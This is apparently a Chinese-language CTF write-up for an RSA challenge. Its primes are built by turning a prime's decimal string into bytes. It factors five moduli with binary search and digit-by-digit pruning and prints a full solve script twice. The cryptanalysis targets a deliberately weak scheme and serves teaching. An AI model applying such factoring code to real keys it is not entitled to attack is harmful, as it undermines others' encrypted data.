44836759088389215801662306050375432910426695023654894661152471598197009644316944364461563733708795401026569460109604554622161444073404474265330567406370705019579756826106816505952084633979876247266812002057927154389274998399825703196810049647324831928277737068842860115202258059693760003397831075633707611377854322143735834890385706873765241863615950449707047454133596389612468366465634011925228326638487664313491916754929381088396403448356901628825906815317934440495749705736715790281606858736722493438754469493049523175471903946974639097168758949520143915621139415847104585816466890751841858540120267543411140490236193353524030168152197407408753865346510476692347085048554088639428645948051171829012753631844379643600528027854258899402371612\nPhase 1首先观察一下函数getSuperPrime(nbits)，其首先生成一个nbits位的素数p，将其转换为字符串后用函数bytes_to_long()再次转换，循环直到结果为素数pp为止，返回值为p，pp，查看一下bytes_to_long()的源码：\ndef bytes_to_long(s):    \"\"\"Convert a byte string to a long integer (big endian).    In Python 3.2+, use the native method instead::        &gt;&gt;&gt; int.from_bytes(s, 'big')    For instance::        &gt;&gt;&gt; int.from_bytes(b'\\x00P', 'big')        80    This is (essentially) the inverse of :func:`long_to_bytes`.    \"\"\"    acc = 0    unpack = struct.unpack    # Up to Python 2.7.4, struct.unpack can't work with bytearrays nor    # memoryviews    if sys.version_info[0:3] &lt; (2, 7, 4):        if isinstance(s, bytearray):            s = bytes(s)        elif isinstance(s, memoryview):            s = s.tobytes()    length = len(s)    if length % 4:        extra = (4 - length % 4)        s = b'\\x00' * extra + s        length = length + extra    for i in range(0, length, 4):        acc = (acc &lt;&lt; 32) + unpack('&gt;I', s[i:i+4])[0]    return acc\n整个函数就是把参数的每一个字节转成16进制然后拼起来，显然，p越大，pp也越大，那么我们便可以对进行二分规约\n#Phrase 1def l2b2l(p):    trans=str(p).encode()    return(bytes_to_long(trans))def break1(n):    l=0    r=2**512    v=0    while(l&lt;=r):        m=(l+r)//2        v=m*l2b2l(m)        if(v&lt;n):            l=m        elif(v&gt;n):            r=m        else:            return m,n//m\nPhase 2对和进行分析：\n\n\\begin{align}\nn_2&=p_2*p_3\\\\\n&=(a_{01}+a_{11}*10+a_{21}*{10}^2+...)*(a_{02}+a_{12}*10+a_{22}*{10}^2+...)\\\\\nn_3&=q_2*q_3\\\\\n&=[(a_{01}+48)+(a_{11}+48)*256+(a_{21}*48)*{256}^2+...]*[(a_{02}+48)+(a_{12}+48)*256+(a_{22}*48)*{256}^2+...]\\\\\nTherefore,\\\\\nn_2&=a_{01}*a_{02}&(mod\\ 10)\\\\\nn_2&=(a_{01}+a_{11}*10)*(a_{02}+a_{12}*10)&(mod\\ {10}^2)\\\\\n&...\\\\\nn_2&=(a_{01}+...+a_{n1}*{10}^n)*(a_{02}+...+a_{n2}*{10}^{n})&(mod\\ {10}^{n+1})\\\\\n\\\\\nn_3&=(a_{01}+48)*(a_{02}+48)&(mod\\ 256)\\\\\n...\\\\\nn_3&=[(a_{01}+48)+...+(a_{n1}+48)*{256}^n]*[(a_{02}+48)+...+(a_{n2}+48)*{256}^n]&(mod\\ {256}^{n+1})\n\\end{align}所以可以对每一位进行爆破\n#Phase 2#Prune and Search#official writeup from maple3142def break2(n1, n2):    n1p = None    def test_digits(ps, qs):        nonlocal n1p        if n1p is not None:            return False        p = sum([pi * 10**i for i, pi in enumerate(ps)])        pp = sum([(48 + pi) * 256**i for i, pi in enumerate(ps)])        q = sum([pi * 10**i for i, pi in enumerate(qs)])        qq = sum([(48 + pi) * 256**i for i, pi in enumerate(qs)])        if p != 0 and p != 1 and n1 % p == 0:            n1p = p            return False        m1 = 10 ** len(ps)        m2 = 256 ** len(qs)        return (p * q) % m1 == n1 % m1 and (pp * qq) % m2 == n2 % m2    def find_ij(ps, qs):        for i in range(10):            for j in range(10):                if test_digits(ps + [i], qs + [j]):                    yield i, j    def search(ps, qs):        for i, j in find_ij(ps, qs):            search(ps + [i], qs + [j])    search([], [])    n2p = bytes_to_long(str(n1p).encode())    assert n2 % n2p == 0    return (n1p, n1 // n1p), (n2p, n2 // n2p)\nPhase 3第三部分很简单，可以直接参照第一部分，只是这里有一些小变化，$n_4=p_4l2b2l(p_5)=p_4l2b2l(\\frac{n_5}{l2b2l(p_4)})$，仍然进行二分规约\n#Phase3def break3(n1, n2):    def try_factor(l, r):        while l &lt; r:            m = (l + r) // 2            if m &gt; 1 and n1 % m == 0:                return m            if m * l2b2l(n2 // l2b2l(m)) &lt; n1:                l = m + 1            else:                r = m - 1    for i in range(16):        # brute force top 4 bits of p1        # because len(str(p1)) must be constant to have monotonic property        l = i &lt;&lt; 508        r = l + (1 &lt;&lt; 508)        if p1 := try_factor(l, r):            return (p1, n1 // p1), (l2b2l(p1), n2 // l2b2l(p1))\n所有的p和q都知道了，直接进行RSA解密即可得到flag\nEXPfrom Crypto.Util.number import *from gmpy2 import *#Phase 1def l2b2l(p):    trans=str(p).encode()    return(bytes_to_long(trans))def break1(n):    l=0    r=2**512    v=0    while(l&lt;=r):        m=(l+r)//2        v=m*l2b2l(m)        if(v&lt;n):            l=m        elif(v&gt;n):            r=m        else:            return m,n//m#Phase 2#Prune and Search#official writeup from maple3142def break2(n1, n2):    n1p = None    def test_digits(ps, qs):        nonlocal n1p        if n1p is not None:            return False        p = sum([pi * 10**i for i, pi in enumerate(ps)])        pp = sum([(48 + pi) * 256**i for i, pi in enumerate(ps)])        q = sum([pi * 10**i for i, pi in enumerate(qs)])        qq = sum([(48 + pi) * 256**i for i, pi in enumerate(qs)])        if p != 0 and p != 1 and n1 % p == 0:            n1p = p            return False        m1 = 10 ** len(ps)        m2 = 256 ** len(qs)        return (p * q) % m1 == n1 % m1 and (pp * qq) % m2 == n2 % m2    def find_ij(ps, qs):        for i in range(10):            for j in range(10):                if test_digits(ps + [i], qs + [j]):                    yield i, j    def search(ps, qs):        for i, j in find_ij(ps, qs):            search(ps + [i], qs + [j])    search([], [])    n2p = bytes_to_long(str(n1p).encode())    assert n2 % n2p == 0    return (n1p, n1 // n1p), (n2p, n2 // n2p)#Phase3def break3(n1, n2):    def try_factor(l, r):        while l &lt; r:            m = (l + r) // 2            if m &gt; 1 and n1 % m == 0:                return m            if m * l2b2l(n2 // l2b2l(m)) &lt; n1:                l = m + 1            else:                r = m - 1    for i in range(16):        # brute force top 4 bits of p1        # because len(str(p1)) must be constant to have monotonic property        l = i &lt;&lt; 508        r = l + (1 &lt;&lt; 508)        if p1 := try_factor(l, r):            return (p1, n1 // p1), (l2b2l(p1), n2 // l2b2l(p1))#breakwith open(\"output.txt\") as f:    exec(f.read())p1,q1=break1(n1)(p2,p3),(q2,q3)=break2(n2,n3)(p4,q5),(p5,q4)=break3(n4,n5)phi1=(p1-1)*(q1-1)phi2=(p2-1)*(p3-1)phi3=(q2-1)*(q3-1)phi4=(p4-1)*(q5-1)phi5=(p5-1)*(q4-1)d1=invert(e,phi1)d2=invert(e,phi2)d3=invert(e,phi3)d4=invert(e,phi4)d5=invert(e,phi5)c=pow(c,d3,n3)c=pow(c,d4,n4)c=pow(c,d5,n5)c=pow(c,d1,n1)c=pow(c,d2,n2)print(long_to_bytes(c))\n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]}]